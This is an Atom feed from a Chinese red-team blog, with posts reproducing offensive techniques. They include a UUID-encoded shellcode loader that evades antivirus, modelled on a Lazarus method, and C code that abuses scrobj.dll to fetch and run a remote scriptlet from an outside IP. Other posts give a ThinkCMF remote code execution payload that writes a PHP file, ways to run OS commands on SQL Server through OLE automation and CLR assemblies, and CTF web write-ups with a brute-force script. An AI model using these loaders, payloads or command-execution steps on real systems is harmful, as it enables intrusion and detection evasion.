<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-01-25T05:28:36.566Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UID shellcode硬编码</title>
    <link href="http://422926799.github.io/posts/9f6e42ac.html"/>
    <id>http://422926799.github.io/posts/9f6e42ac.html</id>
    <published>2021-01-25T05:09:49.000Z</published>
    <updated>2021-01-25T05:28:36.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的<br>原文链接：<a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" target="_blank" rel="noopener">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>原文给出的shellcode如下</p><pre><code>1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></pre><p>shellcode转换成UUID后和原文是对的上的</p><pre><code class="py">import uuidimport binasciiimport chardetbuf=b&quot;1\xc0PhcalcTYP@\x92t\x15Qd\x8br/\x8bv\x0c\x8bv\x0c\xad\x8b0\x8b~\x18\xb2P\xeb\x1a\xb2`H)\xd4eH\x8b2H\x8bv\x18H\x8bv\x10H\xadH\x8b0H\x8b~0\x03W&lt;\x8b\\\x17(\x8bt\x1f H\x01\xfe\x8bT\x1f$\x0f\xb7,\x17\x8dR\x02\xad\x81&lt;\x07WinEu\xef\x8bt\x1f\x1cH\x01\xfe\x8b4\xaeH\x01\xf7\x99\xff\xd7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;hex_buf=binascii.hexlify(buf).decode()tmp=&quot;&quot;for k in hex_buf:    tmp+=k    if len(tmp)==32:        print(&quot;\&quot;{}\&quot;,&quot;.format(uuid.UUID(bytes_le=binascii.unhexlify(tmp))))        tmp=&quot;&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1gmzvadouzcj30rv07z3ze.jpg" alt=""></p><p>执行shellcode</p><pre><code class="C">// uuidrun.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={    &quot;6850c031-6163-636c-5459-504092741551&quot;,    &quot;2f728b64-768b-8b0c-760c-ad8b308b7e18&quot;,    &quot;1aeb50b2-60b2-2948-d465-488b32488b76&quot;,    &quot;768b4818-4810-48ad-8b30-488b7e300357&quot;,    &quot;175c8b3c-8b28-1f74-2048-01fe8b541f24&quot;,    &quot;172cb70f-528d-ad02-813c-0757696e4575&quot;,    &quot;1f748bef-481c-fe01-8b34-ae4801f799ff&quot;,    &quot;000000d7-0000-0000-0000-000000000000&quot;,};int main(){    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //在进程的虚拟地址空间中保留空间    void* ha = HeapAlloc(hc, 0, 0x100000); //申请内存    DWORD_PTR hptr = (DWORD_PTR)ha;    int elems = sizeof(uuids) / sizeof(uuids[0]);    for (int i = 0; i &lt; elems; i++) {        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr); //UUID转换为原来的shellcode写入内存        if (status != RPC_S_OK) {            printf(&quot;UuidFromStringA() != S_OK\n&quot;);            CloseHandle(ha);            return -1;        }        hptr += 16;    }    printf(&quot;[*] Hexdump: &quot;);    for (int i = 0; i &lt; elems * 16; i++) {        printf(&quot;%02X &quot;, ((unsigned char*)ha)[i]);    }    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //枚举操作系统上安装或支持的语言环境。    return 0;}</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1gmzvgcl40yj31560mf442.jpg" alt=""></p><p>原文的shellcode反汇编后如下</p><pre><code class="asm">xor eax, eax ;清空eaxpush raxpush 0x636c6163 ;calcpush rsppop rcxpush raxxchg eax, edx ;交换edx和eax的值，EAX=EDX,EDX=EAXje 0x24push rcxmov esi, dword ptr fs:[rdx + 0x2f] ;寻找PEB地址mov esi, dword ptr [rsi + 0xc]mov esi, dword ptr [rsi + 0xc]lodsd eax, dword ptr [rsi]mov esi, dword ptr [rax]mov edi, dword ptr [rsi + 0x18]mov dl, 0x50jmp 0x3emov dl, 0x60sub rsp, rdxmov rsi, qword ptr gs:[rdx] ;寻找PEB地址mov rsi, qword ptr [rsi + 0x18]mov rsi, qword ptr [rsi + 0x10]lodsq rax, qword ptr [rsi]mov rsi, qword ptr [rax]mov rdi, qword ptr [rsi + 0x30]add edx, dword ptr [rdi + 0x3c]mov ebx, dword ptr [rdi + rdx + 0x28]mov esi, dword ptr [rdi + rbx + 0x20]add rsi, rdimov edx, dword ptr [rdi + rbx + 0x24]movzx ebp, word ptr [rdi + rdx]lea edx, [rdx + 2]lodsd eax, dword ptr [rsi]cmp dword ptr [rdi + rax], 0x456e6957jne 0x50mov esi, dword ptr [rdi + rbx + 0x1c]add rsi, rdimov esi, dword ptr [rsi + rbp*4]add rdi, rsicdq call rdiadd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], aladd byte ptr [rax], al</code></pre><p>尝试用msf的shellcode来整UUID。发现并不行，估计shellcode需要修改，不会改，算篇复现文…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;翻文章的时候翻到一篇，将shellcode硬编码成UID。然后在把UID解密写入内存空间后执行的&lt;br&gt;原文链接：&lt;a href=&quot;http</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>regsvr32绕过</title>
    <link href="http://422926799.github.io/posts/b2680e3b.html"/>
    <id>http://422926799.github.io/posts/b2680e3b.html</id>
    <published>2021-01-19T17:46:02.000Z</published>
    <updated>2021-01-19T17:55:02.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波<br>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247486668&amp;idx=1&amp;sn=b490c44dd870307a574818fd2d56e4a3&amp;chksm=fb183ffecc6fb6e80f6ff64781325ebdfc8edc14462b2c6921213dcb72845dc243a2dc6f5176" target="_blank" rel="noopener">regsvr32绕过</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>regsvr32远程下载是调用scrobj.dll里的DllInstall函数实现的下载<br><img src="https://s3.ax1x.com/2021/01/20/sRKxoV.png" alt=""></p><p>IDA分析<br><img src="https://s3.ax1x.com/2021/01/20/sRMSiT.md.png" alt=""></p><p>API Monitor跟踪这个dll<br><img src="https://s3.ax1x.com/2021/01/20/sRM9WF.png" alt=""></p><p>搜索API关键名称CreateURLMonikerEx，找到函数位置<br><img src="https://s3.ax1x.com/2021/01/20/sRMiQJ.png" alt=""></p><p>搜索该函数调用点在sub_1800072D0，符合DllInstall函数调用<br><img src="https://s3.ax1x.com/2021/01/20/sRMZo6.png" alt=""></p><p>调用该函数实现regsvr32实现功能</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define error_print(name){printf(&quot;%s,Error Code:%d&quot;,GetLastError());exit(1);}int main(){        LPCSTR dllpath = &quot;c:\\windows\\system32\\scrobj.dll&quot;;        HMODULE load = LoadLibraryA(dllpath);        if (load == NULL) {               error_print(&quot;LoadLibraryA&quot;);        }        FARPROC getmodule = GetProcAddress(load, &quot;DllInstall&quot;);        if (getmodule == NULL) {               error_print(&quot;GetProcAddress&quot;);        }        ((void(*)(BOOL, TCHAR*))getmodule)(FALSE, L&quot;http://192.168.137.227/testx.txt&quot;); //指针函数调用    return 0;}</code></pre><p>testx.txt</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;&lt;component id=&quot;TESTING&quot;&gt;&lt;registration  progid=&quot;TESTING&quot;  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;  &lt;script language=&quot;JScript&quot;&gt;    &lt;![CDATA[      var wsc = &quot;WScript.Shell&quot;;      var com = &quot;calc&quot;;      com.concat(&quot;.&quot;,&quot;e&quot;,&quot;x&quot;,&quot;e&quot;);      var foo = new ActiveXObject(wsc).Run(com);    ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/component&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/20/sRMQQH.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波&lt;br&gt;参考链接</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>ThinkCMF任意包含漏洞复现</title>
    <link href="http://422926799.github.io/posts/3656eb8c.html"/>
    <id>http://422926799.github.io/posts/3656eb8c.html</id>
    <published>2021-01-09T07:34:49.000Z</published>
    <updated>2021-01-09T07:42:16.658Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞出在：application\Portal\Controller\IndexController.class.php<br>首先引用Common\Controller\HomebaseController控制类文件，然后调用display函数<br><img src="https://s3.ax1x.com/2021/01/09/sMq958.png" alt=""></p><p>跟入display函数看描述就是可以自定义加载模版，通过$this-&gt;parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。<br><img src="https://s3.ax1x.com/2021/01/09/sMqZbq.png" alt=""></p><pre><code class="php">public function parseTemplate($template=&#39;&#39;) {   $tmpl_path=C(&quot;SP_TMPL_PATH&quot;); // 前台模板文件根目录 themes/   define(&quot;SP_TMPL_PATH&quot;, $tmpl_path);   if($this-&gt;theme) { // 指定模板主题       $theme = $this-&gt;theme;   }else{       // 获取当前主题名称       $theme      =    C(&#39;SP_DEFAULT_THEME&#39;); // 前台模板文件 simplebootx       if(C(&#39;TMPL_DETECT_THEME&#39;)) {// 自动侦测模板主题           $t = C(&#39;VAR_TEMPLATE&#39;); //默认模板切换变量 t           if (isset($_GET[$t])){               $theme = $_GET[$t];           }elseif(cookie(&#39;think_template&#39;)){               $theme = cookie(&#39;think_template&#39;);           }           if(!file_exists($tmpl_path.&quot;/&quot;.$theme)){ //判断前台模板文件是否存在               $theme  =   C(&#39;SP_DEFAULT_THEME&#39;);           }           cookie(&#39;think_template&#39;,$theme,864000);       }   }   $theme_suffix=&quot;&quot;;   if(C(&#39;MOBILE_TPL_ENABLED&#39;) &amp;&amp; sp_is_mobile()){//开启手机模板支持       if (C(&#39;LANG_SWITCH_ON&#39;,null,false)){           if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile_&quot;.LANG_SET)){//优先级最高               $theme_suffix  =  &quot;_mobile_&quot;.LANG_SET;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){               $theme_suffix  =  &quot;_mobile&quot;;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_&quot;.LANG_SET)){               $theme_suffix  =  &quot;_&quot;.LANG_SET;           }       }else{              if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){                  $theme_suffix  =  &quot;_mobile&quot;;              }       }   }else{       $lang_suffix=&quot;_&quot;.LANG_SET;       if (C(&#39;LANG_SWITCH_ON&#39;,null,false) &amp;&amp; file_exists($tmpl_path.&quot;/&quot;.$theme.$lang_suffix)){           $theme_suffix = $lang_suffix;       }   }   $theme=$theme.$theme_suffix; //定义当前语言   C(&#39;SP_DEFAULT_THEME&#39;,$theme);   $current_tmpl_path=$tmpl_path.$theme.&quot;/&quot;;   // 获取当前主题的模版路径   define(&#39;THEME_PATH&#39;, $current_tmpl_path);   $cdn_settings=sp_get_option(&#39;cdn_settings&#39;);   if(!empty($cdn_settings[&#39;cdn_static_root&#39;])){       $cdn_static_root=rtrim($cdn_settings[&#39;cdn_static_root&#39;],&#39;/&#39;);       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,$cdn_static_root.&quot;/&quot;.$current_tmpl_path);       C(&quot;TMPL_PARSE_STRING.__PUBLIC__&quot;,$cdn_static_root.&quot;/public&quot;);       C(&quot;TMPL_PARSE_STRING.__WEB_ROOT__&quot;,$cdn_static_root);   }else{       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,__ROOT__.&quot;/&quot;.$current_tmpl_path);   }   C(&#39;SP_VIEW_PATH&#39;,$tmpl_path);   C(&#39;DEFAULT_THEME&#39;,$theme);   define(&quot;SP_CURRENT_THEME&quot;, $theme);   if(is_file($template)) {      return $template;   }   $depr       =   C(&#39;TMPL_FILE_DEPR&#39;);   $template   =   str_replace(&#39;:&#39;, $depr, $template);   // 获取当前模块   $module   =  MODULE_NAME;   if(strpos($template,&#39;@&#39;)){ // 跨模块调用模版文件      list($module,$template)  =   explode(&#39;@&#39;,$template);   }   $module =$module.&quot;/&quot;;   // 分析模板文件规则   if(&#39;&#39; == $template) {      // 如果模板文件名为空 按照默认规则定位      $template = CONTROLLER_NAME . $depr . ACTION_NAME;   }elseif(false === strpos($template, &#39;/&#39;)){      $template = CONTROLLER_NAME . $depr . $template;   }   $file = sp_add_template_file_suffix($current_tmpl_path.$module.$template);   $file= str_replace(&quot;//&quot;,&#39;/&#39;,$file);   if(!file_exists_case($file)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$file);   return $file;}</code></pre><p>由于parseTemplate函数为模板渲染函数，而该函数权限为public。导致可控，最终payload如下：<br>/?a=fetch&amp;templateFile=public/index&amp;prefix=’’&amp;content=<php>file_put_contents(‘test.php’,’&lt;?php phpinfo(); ?&gt;’)</php><br><img src="https://s3.ax1x.com/2021/01/09/sMqMPU.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/09/sMq8M9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/ch459742906/p/5949168.html" target="_blank" rel="noopener">https://www.cnblogs.com/ch459742906/p/5949168.html</a><br><a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw</a><br><a href="https://www.cnblogs.com/0daybug/p/11720575.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11720575.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h2&gt;&lt;p&gt;根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>sql server没xp_cmdshell执行命令</title>
    <link href="http://422926799.github.io/posts/639a5410.html"/>
    <id>http://422926799.github.io/posts/639a5410.html</id>
    <published>2021-01-07T00:32:40.000Z</published>
    <updated>2021-01-07T00:43:01.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用COM执行命令"><a href="#利用COM执行命令" class="headerlink" title="利用COM执行命令"></a>利用COM执行命令</h2><p>（需要开启Ole Automation Procedures组件）</p><pre><code>declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@luan output;exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe /c whoami&#39;;exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;exec sp_oamethod @text, &#39;readall&#39;, @str out;select @str;</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs3hd.png" alt=""></p><p>没有开启Ole Automation Procedures，可以用下面的命令开启</p><pre><code>sp_configure &#39;show advanced options&#39;, 1;GORECONFIGURE;GOsp_configure &#39;Ole Automation Procedures&#39;, 1;GORECONFIGURE;GO</code></pre><h2 id="编写CLR实现执行命令"><a href="#编写CLR实现执行命令" class="headerlink" title="编写CLR实现执行命令"></a>编写CLR实现执行命令</h2><p>编写语言：C#<br>Vs创建类库</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System;using System.Threading.Tasks;namespace shellexec{    public class exec    {        public static string cmd(string command)        {            System.Diagnostics.Process pro = new System.Diagnostics.Process();            pro.StartInfo.FileName = &quot;cmd.exe&quot;;            pro.StartInfo.UseShellExecute = false;            pro.StartInfo.RedirectStandardError = true; //标准错误            pro.StartInfo.RedirectStandardInput = true; //标准输入            pro.StartInfo.RedirectStandardOutput = true; //标准输出            pro.StartInfo.CreateNoWindow = true; //是否在新窗口开启进程            pro.Start();            pro.StandardInput.WriteLine(command + &quot;&amp;&amp;exit&quot;); //命令参数写入            pro.StandardInput.AutoFlush = true; //缓冲区自动刷新            string output = pro.StandardOutput.ReadToEnd(); //读取执行结果            pro.WaitForExit(); //等待执行完成退出            pro.Close();            return output.ToString();        }    }}</code></pre><p>生成dll后，可以用hex的方法写到目标，或者shell上传。然后开始构造<br>1.目标数据库实例需要启用clr集成</p><pre><code>exec sp_configure &#39;clr enabled&#39;, 1;--在SQL Server中启用CLRreconfigure;go</code></pre><p>2.目标数据库的可信任属性需要设为false,可以使用以下语句启用</p><pre><code>ALTER DATABASE [&lt;数据库名称&gt;] SET TRUSTWORTHY ON</code></pre><p>3.在数据库中注册DLL</p><pre><code>CREATE ASSEMBLY MySqlCLR FROM &#39;&lt;dll的路径&gt;&#39; //MySqlCLR为导入dll后的变量名称</code></pre><p>4.创建函数<br>（根据对应函数的类型的参数构造对应的参数类型，然后RETURNS [nvarchar] (max)记得设置为返回最大如果是返回string类型的话），在直接这个dll的名称在那个命名空间、类、函数）</p><pre><code>CREATE FUNCTION [dbo].[cmd2]  (      @cmd AS NVARCHAR(max))  RETURNS [nvarchar] (max) WITH EXECUTE AS CALLERAS  EXTERNAL NAME [MySqlCLR].[shellexec.exec].cmd //shellexec为命名空间，exec为类名，cmd为函数名GO</code></pre><p>5.程序集的权限级别必须设为 external access,否则在部署的时候会报错</p><pre><code>ALTER ASSEMBLY [MySqlCLR]WITH PERMISSION_SET = UNSAFE</code></pre><p>6.调用存储过程和函数方法</p><pre><code>select [dbo].[cmd2](&#39;whoami&#39;)</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs6cq.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/07/sZsWHU.png" alt=""></p><p>参考链接：<br><a href="https://blog.csdn.net/catchme_439/article/details/78411009" target="_blank" rel="noopener">https://blog.csdn.net/catchme_439/article/details/78411009</a><br><a href="https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用COM执行命令&quot;&gt;&lt;a href=&quot;#利用COM执行命令&quot; class=&quot;headerlink&quot; title=&quot;利用COM执行命令&quot;&gt;&lt;/a&gt;利用COM执行命令&lt;/h2&gt;&lt;p&gt;（需要开启Ole Automation Procedures组件）&lt;/p&gt;
&lt;pre</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>学校ctf部分wp</title>
    <link href="http://422926799.github.io/posts/81eaad2f.html"/>
    <id>http://422926799.github.io/posts/81eaad2f.html</id>
    <published>2021-01-04T05:22:17.000Z</published>
    <updated>2021-01-04T06:41:10.360Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1390440146&auto=1&height=66"></iframe><p><strong>主要是web题的wp</strong></p><h2 id="flag给你"><a href="#flag给你" class="headerlink" title="flag给你"></a>flag给你</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPMH1S.png" alt=""></p><p>访问链接得到flag，给出的flag少了一个-。加上去即可<br><img src="https://s3.ax1x.com/2021/01/04/sPMX0s.png" alt=""></p><pre><code>flag{091efg59-258e-3abv-c3h7-f18769f21b59}</code></pre><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>给出一段code</p><pre><code class="php">&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$key = &quot;abcdefg!!!&quot;;$str = $_GET[&#39;str&#39;];if (unserialize($str) === &quot;$key&quot;){    echo $flag;}show_source(__FILE__);?&gt;</code></pre><p>序列化code如下</p><pre><code class="php">&lt;?phperror_reporting(0);//include &quot;flag.php&quot;;$key = &quot;abcdefg!!!&quot;;$str = &quot;abcdefg!!!&quot;;echo serialize($str);?&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPlk28.png" alt=""></p><h2 id="你猜"><a href="#你猜" class="headerlink" title="你猜"></a>你猜</h2><p>Ctrl+U得到注释的code<br><img src="https://s3.ax1x.com/2021/01/04/sPlVKg.png" alt=""></p><pre><code class="php">&lt;?phpsession_start();$_SESSION[&#39;pwd&#39;]=time();if (isset ($_POST[&#39;password&#39;])) {    if ($_POST[&#39;pwd&#39;] == $_SESSION[&#39;pwd&#39;])        die(&#39;Flag:&#39;.$flag);    else{        print &#39;&lt;p&gt;猜测错误.&lt;/p&gt;&#39;;        $_SESSION[&#39;pwd&#39;]=time().time();    }}?&gt;</code></pre><p>session ID是我们可控的，pwd也是我们可控的，唯一就是session我们无法控制是多少，但是可以置为空<br>删除PHPSESSID即可<br><img src="https://s3.ax1x.com/2021/01/04/sP1tl8.png" alt=""></p><h2 id="flag在那里"><a href="#flag在那里" class="headerlink" title="flag在那里"></a>flag在那里</h2><p>打开一个lnk，点开跳转到404<br><img src="https://s3.ax1x.com/2021/01/04/sP12XF.png" alt=""></p><p>抓包发现把flag base64编码放在了请求头<br><img src="https://s3.ax1x.com/2021/01/04/sP15kR.png" alt=""></p><pre><code>ctf{f31a81e91afdcf0b84dfee82ec2fb196}</code></pre><h2 id="不想和你说话"><a href="#不想和你说话" class="headerlink" title="不想和你说话"></a>不想和你说话</h2><p><img src="https://s3.ax1x.com/2021/01/04/sP17p6.png" alt=""></p><p>典型的变量覆盖，把b覆盖为空。a参数为空，非===达到若判断，””==False<br><img src="https://s3.ax1x.com/2021/01/04/sP3YNR.png" alt=""></p><h2 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h2><p>没什么好说的，访问shell.php。密码为hack，得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sP34KS.png" alt=""></p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p><img src="https://s3.ax1x.com/2021/01/04/sP3H5n.png" alt=""></p><p>查看js，访问data.php。然后解析json显示<br><img src="https://s3.ax1x.com/2021/01/04/sP3XvT.png" alt=""></p><p>拿原题的脚本跑即可得到flag</p><pre><code class="python">import asyncioimport timeimport aiohttpimport jsoncalc=0class test(object):    async def crackpassword(self,number):        global calc        if calc &gt; 0:            print(calc)            exit()        async with number:            async with aiohttp.ClientSession(headers={&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;}) as session:                async with session.get(url=&quot;http://10.20.105.228:8811/data.php&quot;) as response:                    jsons=json.loads(await response.text())                    if jsons[&#39;angle&#39;]&gt;=150 and jsons[&#39;angle&#39;]&lt;=210:                        print(jsons[&#39;flag&#39;])                        calc+=1    async def run(self):        number=asyncio.Semaphore(500)        data=[self.crackpassword(number) for k in range(500)]        await asyncio.wait(data)if __name__ == &#39;__main__&#39;:    obj=test()    loop=asyncio.get_event_loop()    loop.run_until_complete(obj.run())    loop.close()</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sP8oQK.png" alt=""></p><h2 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPGuOU.png" alt=""></p><p>根据GET请求得到下一个请求<br><img src="https://s3.ax1x.com/2021/01/04/sPGN6K.png" alt=""></p><p>请求告知不是admin<br><img src="https://s3.ax1x.com/2021/01/04/sPG0TH.png" alt=""></p><p>带上X-Forwarded-For头设为127.0.0.1即可得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sPGrtA.png" alt=""></p><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>打开url，点击lnk下载flag.txt告知flag不在此。注释看到flag.php<br><img src="https://s3.ax1x.com/2021/01/04/sPGf0g.png" alt=""></p><p>下载flag.php得到code</p><pre><code class="php">&lt;?phpheader(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码function encrypt($data, $key) {    $key = md5 ( $key );    $x = 0;    $len = strlen ( $data );    $l = strlen ( $key );    for($i = 0; $i &lt; $len; $i ++) {        if ($x == $l) {            $x = 0;        }        $char .= $key {$x};        $x ++;    }    for($i = 0; $i &lt; $len; $i ++) {        $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 );    }    return base64_encode ( $str );}function decrypt($data, $key) {    $key = md5 ( $key );    $x = 0;    $data = base64_decode ( $data );    $len = strlen ( $data );    $l = strlen ( $key );    for($i = 0; $i &lt; $len; $i ++) {        if ($x == $l) {            $x = 0;        }        $char .= substr ( $key, $x, 1 );        $x ++;    }    for($i = 0; $i &lt; $len; $i ++) {        if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) {            $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );        } else {            $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );        }    }    return $str;}$key=&quot;ctf&quot;;$flag=&quot;xWqammfJaWrGm5yayJttaGiTlJRsbGrMmWxqa2fMm50=&quot;;//encrypt($flag,$key)?&gt;</code></pre><p>调用decrypt函数解码得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sPJWgx.png" alt=""></p><pre><code>ctf{d2686e18b9ebc793613d448f73563f8d}</code></pre><h2 id="你算的太慢"><a href="#你算的太慢" class="headerlink" title="你算的太慢"></a>你算的太慢</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPYGM6.png" alt=""></p><p>实验吧原题，直接拿py带session计算重发即可得到flag</p><h2 id="sha"><a href="#sha" class="headerlink" title="sha"></a>sha</h2><p>view得到code</p><pre><code class="php">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;</code></pre><p>数组请求绕过判断，然后不使得判断成立得到flag</p><pre><code>http://10.20.105.228:8812/?name[]=&amp;password[]=admin</code></pre><p><img 